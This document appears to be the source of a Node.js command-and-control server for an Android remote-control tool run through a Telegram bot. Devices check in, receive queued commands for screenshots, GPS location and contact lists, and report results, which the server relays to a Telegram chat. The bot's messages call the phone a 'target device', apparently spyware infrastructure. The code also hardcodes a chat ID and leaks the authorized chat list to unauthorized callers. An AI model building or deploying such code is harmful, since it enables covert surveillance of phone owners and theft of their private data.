{
  "name": "telegram-webhook-server",
  "version": "1.0.0",
  "description": "Telegram bot webhook server for Android remote control",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "axios": "^1.6.2"
  },
  "engines": {
    "node": ">=18.0.0"
  }
}


const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
// Format: devices.set(deviceId, { chatId, lastSeen, pendingCommands, deviceInfo })
const devices = new Map();

// Store authorized chat IDs (you can add multiple)
const authorizedChats = new Set([
    '5326373447', // Your chat ID from the logs
    // Add more chat IDs here if needed
]);

// Middleware
app.use(express.json());

// Verify if the request is from an authorized chat
function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

// Webhook endpoint for Telegram
app.post('/webhook', async (req, res) => {
    const update = req.body;
    console.log('📩 Received update:', JSON.stringify(update, null, 2));

    if (update.message) {
        const chatId = update.message.chat.id;
        const text = update.message.text;
        const messageId = update.message.message_id;

        // Check if this chat is authorized
        if (!isAuthorizedChat(chatId)) {
            console.log(`⛔ Unauthorized access attempt from chat: ${chatId}`);
            await sendTelegramMessage(chatId, 
                '⛔ You are not authorized to use this bot. Please contact the administrator.');
            return res.sendStatus(200);
        }

        // Handle commands
        if (text && text.startsWith('/')) {
            await handleCommand(chatId, text, messageId);
        }
    }

    res.sendStatus(200);
});

// Endpoint for devices to check pending commands
app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device && device.pendingCommands && device.pendingCommands.length > 0) {
        const commands = [...device.pendingCommands];
        device.pendingCommands = []; // Clear after sending
        console.log(`📤 Sending ${commands.length} command(s) to device ${deviceId}`);
        res.json({ commands });
    } else {
        res.json({ commands: [] });
    }
});

// Endpoint for devices to report command results
app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    console.log(`📨 Result from device ${deviceId}:`, { command, result, error });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        const message = error 
            ? `❌ *Command Failed*\n\n${command}\n\nError: ${error}`
            : `✅ *Command Executed*\n\n${command}\n\nResult:\n${result}`;
        
        await sendTelegramMessage(chatId, message);
    }
    
    res.sendStatus(200);
});

// Endpoint for devices to register
app.post('/api/register', async (req, res) => {
    const { deviceId, chatId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId, chatId, deviceInfo });
    
    // Verify the chatId is authorized
    if (!isAuthorizedChat(chatId)) {
        console.log(`⛔ Unauthorized registration attempt from chat: ${chatId}`);
        console.log('✅ Authorized chats are:', Array.from(authorizedChats));
        return res.status(403).json({ 
            status: 'unauthorized', 
            message: 'Chat ID not authorized',
            authorizedChats: Array.from(authorizedChats)
        });
    }
    
    // Store device information
    devices.set(deviceId, {
        chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: []
    });
    
    console.log(`✅ Device registered: ${deviceId} for authorized chat ${chatId}`);
    console.log('📱 Device info:', deviceInfo);
    console.log(`📊 Total devices now: ${devices.size}`);
    
    // Send confirmation to Telegram
    await sendTelegramMessage(chatId, 
        `✅ *Device Connected Successfully!*\n\n` +
        `📱 *Device Details:*\n` +
        `Model: ${deviceInfo.model}\n` +
        `Android: ${deviceInfo.android}\n` +
        `Battery: ${deviceInfo.battery}\n` +
        `ID: ${deviceId.substring(0, 8)}...\n\n` +
        `🎯 *Available Commands:*\n` +
        `/status - Get device status\n` +
        `/screenshot - Take screenshot\n` +
        `/location - Get GPS location\n` +
        `/contacts - Get contacts\n` +
        `/help - Show this menu`);
    
    res.json({ status: 'registered', deviceId: deviceId });
});

// Endpoint to list all registered devices (protected)
app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [id, device] of devices.entries()) {
        deviceList.push({
            deviceId: id.substring(0, 8) + '...',
            chatId: device.chatId,
            lastSeen: new Date(device.lastSeen).toISOString(),
            model: device.deviceInfo?.model || 'Unknown'
        });
    }
    res.json({ 
        total: devices.size,
        devices: deviceList 
    });
});

// Test endpoint
app.post('/api/test/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        console.log(`🔔 Test ping received for device ${deviceId}`);
        device.lastSeen = Date.now();
    }
    
    res.json({ status: 'ok' });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: authorizedChats.size,
        timestamp: Date.now()
    });
});

// Command handler
async function handleCommand(chatId, command, messageId) {
    console.log(`🎯 Handling command ${command} from authorized chat ${chatId}`);

    // Find device for this chat
    let deviceId = null;
    let device = null;
    
    for (const [id, d] of devices.entries()) {
        if (d.chatId === chatId) {
            deviceId = id;
            device = d;
            break;
        }
    }

    if (!deviceId) {
        await sendTelegramMessage(chatId, 
            '❌ No device registered for this chat.\n\n' +
            'Please make sure the Android app is running on your target device.');
        return;
    }

    // Update last seen
    device.lastSeen = Date.now();

    // Handle special commands
    if (command === '/help') {
        await sendTelegramMessage(chatId,
            '📋 *Available Commands*\n\n' +
            '*/status* - Get device status\n' +
            '*/screenshot* - Take a screenshot\n' +
            '*/location* - Get GPS location\n' +
            '*/contacts* - Get contact list\n' +
            '*/help* - Show this menu');
        return;
    }

    // Add command to device's pending queue
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    device.pendingCommands.push({
        command,
        messageId,
        timestamp: Date.now()
    });

    // Acknowledge command receipt
    await sendTelegramMessage(chatId, `⏳ Processing: ${command}`);
    console.log(`📝 Command added to queue for device ${deviceId}`);
}

// Helper to send Telegram messages
async function sendTelegramMessage(chatId, text) {
    try {
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'Markdown'
        });
        console.log(`📨 Message sent to ${chatId}:`, response.data.ok);
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
    }
}

// Helper to send photo
async function sendTelegramPhoto(chatId, photoBuffer, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', photoBuffer, 'screenshot.jpg');
        formData.append('caption', caption);
        
        await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
            headers: { 'Content-Type': 'multipart/form-data' }
        });
    } catch (error) {
        console.error('❌ Error sending photo:', error.response?.data || error.message);
    }
}

// Helper to send document
async function sendTelegramDocument(chatId, documentBuffer, filename, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', documentBuffer, filename);
        formData.append('caption', caption);
        
        await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: { 'Content-Type': 'multipart/form-data' }
        });
    } catch (error) {
        console.error('❌ Error sending document:', error.response?.data || error.message);
    }
}

// Start server
app.listen(PORT, () => {
    console.log('🚀 ==================================');
    console.log(`🚀 Webhook server running on port ${PORT}`);
    console.log(`🚀 Webhook URL: https://your-app.onrender.com/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log('🚀 ==================================');
});
